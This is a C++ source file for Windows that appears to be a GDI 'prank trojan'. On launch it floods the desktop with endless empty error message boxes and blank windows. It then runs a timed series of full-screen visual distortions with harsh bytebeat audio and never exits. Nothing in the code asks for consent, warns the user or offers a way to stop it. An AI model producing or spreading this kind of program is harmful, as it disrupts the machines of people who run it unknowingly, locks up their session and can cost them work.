typedef struct IUnknown IUnknown;
#include <windows.h>
#include <random>
#include <chrono>
#include <cmath>
#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <limits.h>
#include <iostream>
#include <mmsystem.h>
#include <cstdint>
#include <time.h>

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Uuid.lib")
#pragma comment(lib, "winmm.lib")

#define LIGHTRGB (COLORREF)RGB(rand () % 100, rand () % 132, rand () % 150)

HINSTANCE gInst;
int gw, gh;

HDC gScreenDC;
HDC gMemDC;
HDC gTempDC;
HDC gRotDC;

HBITMAP gMemBmp;
HBITMAP gTempBmp;
HBITMAP gRotBmp;

void* gMemBits;
void* gTempBits;
void* gRotBits;

float gAngle = 0.0f;
float gDir = 0.001f;

typedef union myRGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

typedef struct
{
    float x;
    float y;
    float z;
} VERTEX;

typedef struct
{
    int vtx0;
    int vtx1;
} EDGE;


DWORD WINAPI gdi_rgbquad(LPVOID)
{
    RGBQUAD* px = (RGBQUAD*)gMemBits;

    static int t = 0;
    int shift = (t * 4) % gw;
    t++;

    for (int y = 0; y < gh; y++)
    {
        int row = y * gw;
        for (int x = 0; x < gw; x++)
        {
            RGBQUAD base = px[row + x];

            int sx = x + shift;
            if (sx >= gw) sx -= gw;

            float k = (float)sx / (float)gw;

            BYTE r = (BYTE)(k * 255);
            BYTE g = (BYTE)((1 - k) * 255);
            BYTE b = (BYTE)((0.5f + 0.5f * k) * 255);

            RGBQUAD o;
            o.rgbRed = base.rgbRed + r;
            o.rgbGreen = base.rgbGreen + g;
            o.rgbBlue = base.rgbBlue + b;
            o.rgbReserved = 255;

            px[row + x] = o;
        }
    }

    return 0;
}

DWORD WINAPI gdi_rotate(LPVOID)
{
    BitBlt(gRotDC, 0, 0, gw, gh, gMemDC, 0, 0, SRCCOPY);

    float cx = gw * 0.5f;
    float cy = gh * 0.5f;

    float s = sinf(gAngle);
    float c = cosf(gAngle);

    POINT p[3];

    float x0 = -cx, y0 = -cy;
    float x1 = cx, y1 = -cy;
    float x2 = -cx, y2 = cy;

    float rx0 = x0 * c - y0 * s + cx;
    float ry0 = x0 * s + y0 * c + cy;
    float rx1 = x1 * c - y1 * s + cx;
    float ry1 = x1 * s + y1 * c + cy;
    float rx2 = x2 * c - y2 * s + cx;
    float ry2 = x2 * s + y2 * c + cy;

    p[0].x = (LONG)rx0; p[0].y = (LONG)ry0;
    p[1].x = (LONG)rx1; p[1].y = (LONG)ry1;
    p[2].x = (LONG)rx2; p[2].y = (LONG)ry2;

    PlgBlt(gMemDC, p, gRotDC, 0, 0, gw, gh, NULL, 0, 0);

    return 0;
}
int      g_w = 0;
int      g_h = 0;
PRGBQUAD g_rgbScreen = nullptr;
HDC      g_hdcScreen = nullptr;
HDC      g_hdcMem = nullptr;
HBITMAP  g_hbmTemp = nullptr;

void shift_bw()
{
    if (!g_rgbScreen || g_w <= 0 || g_h <= 0)
        return;

    int total = g_w * g_h;

    for (int i = 0; i < total; ++i)
    {
        BYTE gray = (g_rgbScreen[i].r + g_rgbScreen[i].g + g_rgbScreen[i].b) / 3;
        gray = gray + 40;
        g_rgbScreen[i].r = gray;
        g_rgbScreen[i].g = gray;
        g_rgbScreen[i].b = gray;
    }
}

LRESULT CALLBACK WndProc2(HWND h, UINT m, WPARAM w, LPARAM l)
{
    if (m == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(h, m, w, l);
}


DWORD WINAPI MsgThread(LPVOID lp) {
    MessageBoxW(NULL, L"", L"",
        MB_OK | MB_ICONERROR | MB_RTLREADING | MB_RIGHT);
    return 0;
}

DWORD WINAPI MessageBoxSpam(LPVOID lp) {
    while (true) {
        CreateThread(NULL, 0, MsgThread, NULL, 0, NULL);
        Sleep(rand() % 5000);
    }
}



DWORD WINAPI payloadspam4(LPVOID lpParam)
{
    HINSTANCE h = GetModuleHandle(0);

    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc2;
    wc.hInstance = h;
    wc.lpszClassName = "dor";
    RegisterClassA(&wc);

    srand((unsigned)time(0));

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    MSG msg;

    for (;;)
    {
        int x = rand() % (sw - 500);
        int y = rand() % (sh - 500);

        HWND w = CreateWindowExA(
            0,
            "dor",
            "",
            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            x,
            y,
            450,
            320,
            0,
            0,
            h,
            0
        );

		Sleep(rand() % 2000);


        while (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return 0;
}

DWORD WINAPI payloadspam3(LPVOID lpParam)
{
    HINSTANCE h = GetModuleHandle(0);

    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc2;
    wc.hInstance = h;
    wc.lpszClassName = "dor";
    RegisterClassA(&wc);

    srand((unsigned)time(0));

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    MSG msg;

    for (;;)
    {
        int x = rand() % (sw - 500);
        int y = rand() % (sh - 500);

        HWND w = CreateWindowExA(
            0,
            "dor",
            "",
            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            x,
            y,
            750,
            320,
            0,
            0,
            h,
            0
        );

        Sleep(rand() % 3000);


        while (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return 0;
}

DWORD WINAPI payloadspam2(LPVOID lpParam)
{
    HINSTANCE h = GetModuleHandle(0);

    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc2;
    wc.hInstance = h;
    wc.lpszClassName = "dor";
    RegisterClassA(&wc);

    srand((unsigned)time(0));

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    MSG msg;

    for (;;)
    {
        int x = rand() % (sw - 500);
        int y = rand() % (sh - 500);

        HWND w = CreateWindowExA(
            0,
            "dor",
            "",
            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            x,
            y,
            450,
            720,
            0,
            0,
            h,
            0
        );

        Sleep(rand() % 4000);


        while (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return 0;
}

DWORD WINAPI payloadspam1(LPVOID lpParam)
{
    HINSTANCE h = GetModuleHandle(0);

    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc2;
    wc.hInstance = h;
    wc.lpszClassName = "dor";
    RegisterClassA(&wc);

    srand((unsigned)time(0));

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    MSG msg;

    for (;;)
    {
        int x = rand() % (sw - 500);
        int y = rand() % (sh - 500);

        HWND w = CreateWindowExA(
            0,
            "dor",
            "",
            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            x,
            y,
            45,
            500,
            0,
            0,
            h,
            0
        );

        Sleep(rand() % 5000);


        while (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return 0;
}

DWORD WINAPI GDI2(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN);
        HBRUSH brush = CreateSolidBrush(LIGHTRGB);
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI GDI3(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10 * tan(x), rand() % 10, SRCAND);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI GDI4(LPVOID lpParam)
{
    g_hdcScreen = GetDC(nullptr);
    if (!g_hdcScreen) return 0;

    g_w = GetSystemMetrics(SM_CXSCREEN);
    g_h = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = g_w;
    bmi.bmiHeader.biHeight = g_h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    g_hbmTemp = CreateDIBSection(g_hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&g_rgbScreen, nullptr, 0);
    if (!g_hbmTemp || !g_rgbScreen) {
        ReleaseDC(nullptr, g_hdcScreen);
        return 0;
    }

    g_hdcMem = CreateCompatibleDC(g_hdcScreen);
    SelectObject(g_hdcMem, g_hbmTemp);

    DWORD start = GetTickCount();

    while (true)
    {

        {
            HDC hdc = GetDC(HWND_DESKTOP);
            if (hdc) {
                BitBlt(
                    hdc,
                    std::rand() % 30,
                    std::rand() % 30,
                    g_w,
                    g_h,
                    hdc,
                    std::rand() % 30,
                    std::rand() % 30,
                    SRCCOPY
                );
                ReleaseDC(HWND_DESKTOP, hdc);
            }
        }


        BitBlt(g_hdcMem, 0, 0, g_w, g_h, g_hdcScreen, 0, 0, SRCCOPY);


        if (GetTickCount() - start >= 5000)
            shift_bw();


        BitBlt(g_hdcScreen, 0, 0, g_w, g_h, g_hdcMem, 0, 0, SRCCOPY);

        Sleep(5);
    }


    DeleteDC(g_hdcMem);
    DeleteObject(g_hbmTemp);
    ReleaseDC(nullptr, g_hdcScreen);
    return 0;
}

DWORD WINAPI icon(LPVOID lpParam) {
    int a = 0;
    int b = 0;
    int c = 0;
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int cx = w - (w / 2);
        int cy = h - (h / 2);
        DrawIcon(hdc, b + cx, c + cy, LoadIcon(NULL, IDI_ERROR));
        DrawIcon(hdc, -b + cx, -c + cy, LoadIcon(NULL, IDI_INFORMATION));
        DrawIcon(hdc, c + cx, b + cy, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, -c + cx, -b + cy, LoadIcon(NULL, IDI_APPLICATION));
        a += 1;
        b = asin(sin(a * 2.003f / 5.f)) * 100 + (atan(tan(a / 250.f)) * h / 2);
        c = acos(cos(a / 5.f)) * 100 + (asin(cos(a / 2500.f)) * h / 2);
        ReleaseDC(0, hdc);
    }
}


DWORD WINAPI payload6(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(0);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    float sine = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = i;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 30.f + y / screenHeight * .3f, 1.f);
                hslcolor.s = 1.f;

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        sine += 0.1f;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        StretchBlt(hdc, -1, -1, screenWidth + 2, screenHeight + 2, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < h; x++) {
            int offset = (10 * tan(sine * 3 + x * 0.01f));
            BitBlt(hdc, 0, x, w, 1, hdcCopy, offset, x, SRCCOPY);
        }

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < w; y++) {
            int offset = (10 * tan(sine + y * 0.01f));
            BitBlt(hdc, y, 0, 1, h, hdcCopy, y, offset, SRCCOPY);
        }

        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI GDI5(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
        StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI payload9(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(0);
    int x = rand() % w;
    int y = rand() % h;
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = i * (tan((x + (i * 20)) / 100.f) + tan((y + (i * 20)) / 100.f)) * 10;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l += 0.1f;

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        BitBlt(hdc, rand() % 30, rand() % 30, w, h, hdc, rand() % 30, rand() % 30, SRCAND);
        ReleaseDC(NULL, hdc);
    }
}

VOID WINAPI AudioSequence1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << 1 ^ t >> 7 * t >> 1 | 2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI AudioSequence2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 1 | t >> 8) | (t >> 16));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI AudioSequence3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t / 10 | 0) ^ (t / 10 | 0) - 120) % 11 * t / 2 & 127) + (((t / 640 | 0) ^ (t / 60 | 0) - 2) % 13 * t / 2 & 127);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI AudioSequence4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t ^ t + (t >> 7 | 1) ^ (t - 280 ^ t) >> 55));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI AudioSequence5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t * t >> t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    CreateThread(NULL, 0, MessageBoxSpam, NULL, 0, NULL);
    CreateThread(NULL, 0, payloadspam4, NULL, 0, NULL);
    CreateThread(NULL, 0, payloadspam3, NULL, 0, NULL);
    CreateThread(NULL, 0, payloadspam2, NULL, 0, NULL);
    CreateThread(NULL, 0, payloadspam1, NULL, 0, NULL);
    HANDLE GDIPAY = CreateThread(NULL, 0, GDI3, NULL, 0, NULL);
    HANDLE GDIPAY2 = CreateThread(NULL, 0, GDI2, NULL, 0, NULL);
    AudioSequence1();
	Sleep(30000);
    RedrawWindow(0, 0, 0, 133);
	TerminateThread(GDIPAY, 0);
    TerminateThread(GDIPAY2, 0);
	CloseHandle(GDIPAY);
    CloseHandle(GDIPAY2);
    HANDLE GDIPAY3 = CreateThread(NULL, 0, GDI4, NULL, 0, NULL);
    HANDLE GDIPAY4 = CreateThread(NULL, 0, icon, NULL, 0, NULL);
    AudioSequence2();
    Sleep(30000);
    TerminateThread(GDIPAY3, 0);
    CloseHandle(GDIPAY3);
    TerminateThread(GDIPAY4, 0);
    CloseHandle(GDIPAY4);
    HANDLE GDIPAY5 = CreateThread(NULL, 0, GDI5, NULL, 0, NULL);
    AudioSequence3();
    Sleep(30000);
    TerminateThread(GDIPAY5, 0);
    CloseHandle(GDIPAY5);
    HANDLE GDIPAY6 = CreateThread(NULL, 0, payload6, NULL, 0, NULL);
    AudioSequence4();
    Sleep(30000);
    TerminateThread(GDIPAY6, 0);
    CloseHandle(GDIPAY6);
    HANDLE GDIPAY7 = CreateThread(NULL, 0, payload9, NULL, 0, NULL);
    AudioSequence5();
    Sleep(30000);
    TerminateThread(GDIPAY7, 0);
    CloseHandle(GDIPAY7);
    Sleep(-1);
}